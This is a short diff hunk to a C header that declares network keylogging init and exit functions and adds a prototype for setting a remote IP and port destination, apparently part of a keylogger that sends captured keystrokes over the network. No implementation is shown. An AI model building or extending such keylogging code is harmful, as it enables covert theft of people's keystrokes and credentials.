@@ -29,4 +29,5 @@
 int network_keylogging_init(int);
 int network_keylogging_exit(void);
 
+void set_remote_dest(char *remote_ip_and_port);
 #endif
